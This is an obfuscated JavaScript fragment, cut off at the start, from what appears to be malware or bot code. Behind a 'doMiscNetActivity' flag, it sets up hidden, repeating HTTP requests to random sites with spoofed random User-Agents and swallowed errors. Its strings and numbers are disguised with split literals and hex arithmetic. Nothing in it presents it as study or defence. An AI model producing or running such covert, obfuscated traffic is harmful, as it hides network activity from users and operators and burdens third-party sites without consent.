})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x13 * 0x90 + 0x1c39 + -0xb91) * getRandomInt(0x1 * -0x243e + 0x35 * 0x2f + 0x1a84, -0x33a + -0x14d + 0x48c));
}, 0xaa + -0xd12 * -0x1 + -0x3d * 0x38);